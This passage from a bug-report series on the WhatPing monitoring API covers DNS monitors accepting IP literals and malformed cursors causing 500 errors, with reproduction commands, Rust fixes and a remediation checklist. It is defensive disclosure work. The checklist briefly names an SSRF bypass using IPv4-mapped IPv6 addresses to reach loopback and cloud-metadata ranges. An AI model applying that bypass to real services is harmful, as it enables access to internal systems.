| **User-facing footgun** | A user who accidentally pastes an IP instead of a domain into a DNS monitor will get no validation feedback — the monitor is created, appears in the dashboard, and then perpetually fails with a confusing error message. |
| **Inconsistency across intelligence monitors** | The domain monitor correctly rejects ports/schemes (verified: `example.com:8080` → `422`), but the DNS monitor does not reject IP literals. The validation rules are inconsistent across intelligence monitor types. |

---

## Root Cause

The DNS monitor's host validation does not include a check for IP literals. The validation logic for intelligence monitors is missing the IP-literal rejection rule that the documentation describes.

The domain monitor correctly rejects `host: "example.com:8080"` (verified during testing — returns `422` "Domain must not include a port or scheme"), so the validation framework exists, but the IP-literal check is not applied to the DNS monitor type.

This is the same root cause as BUG #3 (SSL monitor accepts IP literals) — the intelligence-monitor host validator is missing the IP-literal rejection rule.

---

## How to Fix

### Recommended — Add an IP-literal check to the shared intelligence-monitor host validator

Apply the IP-literal rejection to the shared validation path used by all intelligence monitors (SSL, domain, DNS, email-auth) in a single fix that addresses both BUG #3 and BUG #4:

```rust
fn validate_intelligence_host(host: &str) -> Result<(), Error> {
    // Reject IP literals (both IPv4 and IPv6)
    if host.parse::<IpAddr>().is_ok() {
        return Err(Error::invalid_request(
            "host must be a bare domain name, not an IP literal"
        ));
    }
    // ... existing scheme/port/path checks
    Ok(())
}
```

This should be applied to all four intelligence monitor types (`ssl`, `domain`, `dns`, `email-auth`) in a single shared validator, fixing BUG #3 (SSL) and BUG #4 (DNS) together.

### Test cases to add

After the fix, these inputs should be rejected with `422`:

| Monitor type | Host value | Expected |
|--------------|-----------|----------|
| dns | `1.1.1.1` | `422` |
| dns | `::1` | `422` |
| dns | `[::ffff:1.1.1.1]` | `422` |
| ssl | `1.1.1.1` | `422` (also fixes BUG #3) |
| domain | `1.1.1.1` | `422` |
| email-auth | `1.1.1.1` | `422` |

---

## Verification After Fix

After deploying the fix, re-run the reproduction command:

```powershell
$body = '{"type":"dns","name":"test-dns-ip","host":"1.1.1.1","dns_record_type":"A"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_dns.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_dns.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected after fix:**
```json
{
  "error": {
    "code": "invalid_request",
    "message": "host must be a bare domain name, not an IP literal"
  }
}
HTTP_STATUS:422
```

Also verify that valid domain names (and subdomains, which the docs explicitly allow for DNS) still work:

```powershell
$body = '{"type":"dns","name":"test-dns-valid","host":"example.com","dns_record_type":"A"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_dns_valid.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_dns_valid.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected:** `201 Created` (valid domain should still be accepted).

Also verify subdomains are still allowed (the DNS docs explicitly state subdomains like `_dmarc.example.com` are supported):

```powershell
$body = '{"type":"dns","name":"test-dns-sub","host":"_dmarc.example.com","dns_record_type":"TXT"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_dns_sub.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_dns_sub.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected:** `201 Created` (subdomains should still be accepted — only IP literals should be rejected).

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 19 Aug 2026 | Bug discovered and confirmed by Vikki Hirapure during manual API testing |
| 19 Aug 2026 | Bug report exported to `whatping-bug-4-dns-ip-literal.md` |

---

## Test Environment

| Item | Value |
|------|-------|
| API base URL | `https://api.whatping.com/v1` |
| Workspace | `Personal` (`n17d91811mzbd9vta919a3fs5s8cstt1`) |
| Key scope | `write` |
| Test monitor created | `test-dns-ip` (`m97bnpshaqaa7mnnsqf46tph598cry6m`) |
| Test monitor deleted | Yes (cleanup confirmed, workspace is empty) |
| Existing email channel | `mahabocw.in` (untouched) |

---

## References

- WhatPing DNS Monitor Docs: `https://www.whatping.com/docs/monitors/dns`
- WhatPing Security Model: `https://www.whatping.com/docs/security`
- WhatPing API Reference: `https://www.whatping.com/docs/api`
- Related bug: BUG #3 — IP Literals Accepted for SSL Monitor (`whatping-bug-3-ssl-ip-literal.md`)

---

*End of report — prepared by Vikki Hirapure, 19 August 2026.*

---

## BUG #5 — Invalid Pagination Cursor → 500 Internal Error

## Summary

Supplying an invalid or malformed `cursor` query parameter to a paginated list endpoint returns `500 Internal Error` instead of a structured `422` validation error. This is an unhandled error path — the cursor decoding logic throws an exception that bubbles up as a generic server error rather than being caught and returned as a client-side validation error.

The WhatPing API documentation states that "Errors always take one shape" (`{"error":{"code":"invalid_request","message":"..."}}`), and the `limit` parameter on the same endpoint correctly returns a `422` with a `field` attribute for invalid input. The `cursor` parameter does not follow the same pattern, indicating the cursor decode path is missing validation/error handling.

---

## Documentation vs. Actual Behavior

### Documentation says errors always take a structured shape

From `https://www.whatping.com/docs/api`:

> "Errors always take one shape:
> ```
> { "error": { "code": "invalid_request", "message": "Interval must be between 20 and 86400 seconds" } }
> ```
> `422` carries a `field` when one input is at fault. Validation is the same code the dashboard runs — if the interface would refuse it, the API refuses it identically."

And:

> "Pagination is by cursor, never offset:
> ```
> curl "https://api.whatping.com/v1/monitors?limit=50" -H "Authorization: Bearer $KEY"
> # -> { "data": [...], "next_cursor": "..." }
> curl "https://api.whatping.com/v1/monitors?cursor=..." -H "Authorization: Bearer $KEY"
> ```
> `next_cursor` is `null` on the last page. `limit` is 1–100, default 25."

### Actual behavior

A garbage `cursor` value (`AAAAinvalid`) returns `500 Internal Error` with a generic `internal_error` code, not the documented `invalid_request` + `field` shape.

---

## Reproduction Steps

### Step 1 — Send a request with a garbage cursor value

**Command:**
```powershell
curl.exe -s "https://api.whatping.com/v1/monitors?cursor=AAAAinvalid" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (BUG — 500 Internal Error):**
```json
{
  "error": {
    "code": "internal_error",
    "message": "Something went wrong"
  }
}
HTTP_STATUS:500
```

The expected behavior is a `422` with `{"error":{"code":"invalid_request","message":"cursor is malformed or expired","field":"cursor"}}`.

---

### Step 2 — Confirm the endpoint works without a cursor (control test)

**Command:**
```powershell
curl.exe -s "https://api.whatping.com/v1/monitors" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (healthy — endpoint works):**
```json
{
  "data": [],
  "next_cursor": null
}
HTTP_STATUS:200
```

This confirms the endpoint and authentication are working — the failure is specifically caused by the invalid cursor value.

---

### Step 3 — Compare with another invalid query param (limit) to see correct behavior

**Command:**
```powershell
curl.exe -s "https://api.whatping.com/v1/monitors?limit=abc" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (healthy — structured 422 with field):**
```json
{
  "error": {
    "code": "invalid_request",
    "message": "limit must be 1–100",
    "field": "limit"
  }
}
HTTP_STATUS:422
```

This shows the API *can* return structured `422` errors for bad query params — the cursor path just doesn't.

---

## Test Results Summary

| # | Query parameter | Expected | Actual | Verdict |
|---|-----------------|----------|--------|---------|
| 1 | `cursor=AAAAinvalid` | `422` with `field: "cursor"` | `500` `internal_error` | 🔴 BUG |
| 2 | (no cursor) | `200` with data | `200` with data | ✅ Endpoint works |
| 3 | `limit=abc` | `422` with `field: "limit"` | `422` with `field: "limit"` | ✅ Correct pattern |

The `limit` parameter follows the documented error shape; the `cursor` parameter does not.

---

## Impact

### Functional Impact: MEDIUM

| Risk | Description |
|------|-------------|
| **Unhelpful error for integrations** | An integration passing a corrupted cursor (e.g. truncated in a URL, a base64 padding error, or a stale cursor from a previous session) receives an unhelpful `500` with no `field` attribute to diagnose the problem. The caller cannot distinguish "my cursor is bad" from "the server is broken." |
| **Wrong error signal** | A `500` is a server-error signal, but this is actually a client error (bad input). It can trigger false-positive alerting in upstream monitoring systems that watch for `5xx` rates as a health indicator. |
| **Inconsistent API contract** | The API returns structured `422` errors for some invalid query parameters (`limit`) but generic `500` for others (`cursor`), making the error contract unreliable for integrations. |
| **Potential information leakage** | Depending on how the cursor is decoded internally, a `500` may produce a stack trace in server logs (not shown to the client, but visible in internal monitoring/Sentry) that reveals implementation details about the cursor format or internal data structures. |

### Why it's not higher severity

- This is not a security vulnerability — no data is leaked to the client (the response body is generic).
- It does not affect data integrity or availability beyond a single failed request.
- It only triggers on malformed client input, not on valid usage.

---

## Root Cause

The cursor decoding logic does not handle invalid input gracefully. When a garbage cursor value is passed, the decode function (likely a base64 decode or a signed-token parse) throws an exception or returns an error that is not caught by the request handler. The unhandled error propagates to the generic error handler, which returns `500 Internal Error`.

The `limit` parameter, by contrast, is parsed as an integer with explicit range validation that returns a structured `422` on failure — showing the correct pattern exists in the codebase but was not applied to the cursor path.

---

## How to Fix

### Recommended — Wrap cursor decoding in a result type and return a structured 422

Catch decode failures at the point where the cursor is parsed and return a `422` with the `field` attribute, matching the documented error shape and the `limit` parameter's behavior:

```rust
let cursor = match raw_cursor {
    None => None,
    Some(raw) => match decode_cursor(raw) {
        Ok(c) => Some(c),
        Err(_) => return Err(Error::invalid_field("cursor", "cursor is malformed or expired")),
    },
};
```

### Alternative — Validate cursor format before decoding

If the cursor has a known format (e.g. base64 with a specific prefix or length), validate the format before attempting to decode:

```rust
fn validate_cursor_format(raw: &str) -> Result<(), Error> {
    if !raw.starts_with("cursor_") || raw.len() < MIN_CURSOR_LEN {
        return Err(Error::invalid_field("cursor", "cursor is malformed or expired"));
    }
    // ... additional format checks
    Ok(())
}
```

### Apply to all paginated endpoints

The fix should be applied to every endpoint that accepts a `cursor` parameter, not just `/v1/monitors`. Based on the API documentation, cursor pagination is used across the API, so this is likely a shared code path — fixing it in one place (the pagination helper) should fix it everywhere.

---

## Verification After Fix

After deploying the fix, re-run the reproduction command:

```powershell
curl.exe -s "https://api.whatping.com/v1/monitors?cursor=AAAAinvalid" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected after fix:**
```json
{
  "error": {
    "code": "invalid_request",
    "message": "cursor is malformed or expired",
    "field": "cursor"
  }
}
HTTP_STATUS:422
```

Also verify that a valid cursor (returned from a previous page) still works:

```powershell
# Get a cursor from a paginated response
curl.exe -s "https://api.whatping.com/v1/monitors?limit=1" -H "Authorization: Bearer [REDACTED]"
# Copy the next_cursor value and use it:
curl.exe -s "https://api.whatping.com/v1/monitors?cursor=VALID_CURSOR_FROM_ABOVE" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected:** `200` with the next page of results (valid cursors should still work).

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 19 Aug 2026 | Bug discovered and confirmed by Vikki Hirapure during manual API testing |
| 19 Aug 2026 | Bug report exported to `whatping-bug-5-invalid-cursor-500.md` |

---

## Test Environment

| Item | Value |
|------|-------|
| API base URL | `https://api.whatping.com/v1` |
| Workspace | `Personal` (`n17d91811mzbd9vta919a3fs5s8cstt1`) |
| Key scope | `write` |
| Test monitors created | None (read-only query) |
| Leftover monitors cleaned | 2 (`test-heartbeat` monitors from earlier tests deleted during cleanup) |
| Existing email channel | `mahabocw.in` (untouched) |

---

## References

- WhatPing API Reference: `https://www.whatping.com/docs/api`
- WhatPing Concepts (pagination): `https://www.whatping.com/docs/concepts`
- Related bug: BUG #6 — Attaching Non-Existent Channel → 500 Internal Error (same class of unhandled-error bug)

---

*End of report — prepared by Vikki Hirapure, 19 August 2026.*

---

# Combined Remediation Priorities

## Priority 1 — Fix SSRF validation

Address BUG #1 by normalizing IPv4-mapped IPv6 addresses before private-network validation. Verify that loopback, RFC1918, link-local/cloud metadata, and other restricted ranges remain blocked after normalization.

## Priority 2 — Restore heartbeat endpoint routing

Address BUG #2 by exempting `/monitor/ping/*` from dashboard authentication middleware or routing it to the API host. Confirm both valid-token `200 {"ok":true}` and invalid-token `404 {"ok":false}` behavior.

## Priority 3 — Unify intelligence-monitor host validation

Address BUG #3 and BUG #4 together through a shared validator for SSL, domain, DNS, and email-auth monitors. IP literals should be rejected with a structured `422`, while valid domain names and supported subdomains continue to work.

## Priority 4 — Handle invalid cursors as client errors

Address BUG #5 by catching cursor-decoding failures and returning the documented structured `422` response with `field: "cursor"`. Apply the fix to the shared pagination path so all cursor-paginated endpoints receive consistent handling.

---

# Final Verification Checklist

| Bug | Required verification |
|---|---|
| BUG #1 | IPv4, IPv4-mapped IPv6, loopback, and cloud metadata targets are rejected with `422`. |
| BUG #2 | Valid heartbeat token returns `200`; invalid token returns `404`; successful pings update the monitor's last-ping state. |
| BUG #3 | SSL IP literals are rejected with `422`; valid domain names remain accepted. |
| BUG #4 | DNS IP literals are rejected with `422`; valid domains/subdomains remain accepted. |
| BUG #5 | Malformed cursor returns structured `422`; valid cursor continues to return the next page successfully. |

---

*Combined report prepared by Vikki Hirapure — 19 August 2026.*
